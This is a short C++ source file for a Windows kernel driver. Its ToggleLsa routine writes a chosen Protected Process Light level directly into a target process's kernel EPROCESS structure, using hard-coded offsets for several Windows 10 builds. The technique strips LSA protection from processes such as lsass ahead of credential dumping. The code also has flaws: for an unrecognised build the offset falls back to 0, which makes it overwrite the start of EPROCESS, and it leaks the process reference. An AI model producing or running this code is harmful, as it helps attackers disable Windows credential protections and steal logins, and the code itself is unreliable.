#include <ntifs.h>
#include <ntddk.h>
#include "LsaUtils.h"

/// <summary>
/// Changes LSA 
/// </summary>
/// <param name="PID"></param>
/// <param name="value">
/// 0 - No PPL
/// 1 - Light
/// 2 - Full
/// </param>
/// <returns></returns>
bool LsaUtils::ToggleLsa(int PID, UCHAR value) {
	PEPROCESS targetProcess;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)PID, &targetProcess);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	PUCHAR pplLevel = (PUCHAR)targetProcess;

	int offset = LsaUtils::GetProtectionIndex();

	pplLevel[offset] = value;

	return TRUE;
}

int LsaUtils::GetProtectionIndex() {
	RTL_OSVERSIONINFOW versionInfo;
	RtlGetVersion(&versionInfo);

	switch (versionInfo.dwBuildNumber) {
	case 10586:
		return 0x6B2;
	case 14393:
		return 0x6C2;
	case 15063:
		return 0x6CA;
	case 16299:
		return 0x6CA;
	case 17134:
		return 0x6CA;
	case 17763:
		return 0x6CA;
	default:
		return 0;
	}
}